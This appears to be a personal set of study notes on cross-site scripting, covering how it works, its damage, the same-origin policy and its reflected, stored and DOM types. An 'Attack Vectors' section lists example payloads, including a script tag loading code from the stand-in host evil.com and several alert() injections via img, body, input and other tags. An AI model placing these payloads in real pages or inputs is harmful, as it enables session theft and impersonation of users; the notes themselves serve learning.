# Cross Site Scripting (XXS) 
XXS is one of most common and dangerous types of vulnerabilities in web apps. It can lead to stolen of modified user data! XXS is a client-side code injection technizue where attacker executes malicious scripts by inserting code into a legit and trusted web page or web app. 

## Where does XXS Occur?
On web pages and web apps. Common vulnerable vehicles to deliver malicious scripts include forums, message boards, and web pages that allow comment. 

## Who is Vulnerable to XXS?
Any web page or app that uses **unsanitized** user input in the output it generates. 


## How Does XXS Work?
XXS attacks are possible in VBScript, ActiveX, Flash, and even CSS. Most common in Javasript b/c JS is fundamental to most browsing experiences. 

- Vulnerable website needs to directly include user input in it's pages. Attacker inserts malicious string that is treated as source code by victim's browser. When victim's page loads, malicious code is executed. 

No difference between HTML code that needs to be rendered, and input we sent out. Browser acceptsout input without realizing that there's a script.


## What Damage Can XXS Cause ?
Malicious JS can access to all object that web page has access to. 
- Session cookies. Attacker can impersonate user, perform actions of behalf of user, and gain access to user's sensitive data. 
- JS can read browser DOM and modify it. 
- JS cann use XMLHttpRequest object to send HTTP requiest with arbitrary content to arbitrary destinations 
- JS can use HTML5 APIs to access geolocation, webcase, microphone, and even specific files 

### Same Origin Policy 
A policy that stops one website from reading or writing data to another. Checks for three things: *Protocol, Host, Port* 

# XXS Attack Vectors 
### <script> tag 
Most straightforward XXS payload. Can reference external JS cde or can embed code within script tage itself. 
`js
<script src=http://evil.com/xss.js></script>
`
`js
<script> alert("XSS"); </script>

`
### JS Events 
`js
<body onload=alert("XSS")>
`

### <body> tag 
`js
<body background="javascript:alert("XSS")">
`

### <img> tag 
`js
<img src="javascript:alert("XSS");">
`

### <input> tag
`js
<input type="image" src="javascript:alert('XSS');">
`

### <link> tag 
`js
<link rel="stylesheet" href="javascript:alert('XSS');">
`

### <table> tag 
`<table background="javascript:alert('XSS')">
`

### <div> tag 
`js
 <div style="background-image: url(javascript:alert('XSS'))">
 `

# Types of XXS

### Refelcted XXS 
Input reflected back in response 

### Stored XXS 
Input persisted inn database

### DOM XXS
Happens entirely on client-side. User's input lands directly inside dangerous part of JS code. 

# Resources 
- https://www.acunetix.com/websitesecurity/cross-site-scripting/
- https://xss-game.appspot.com/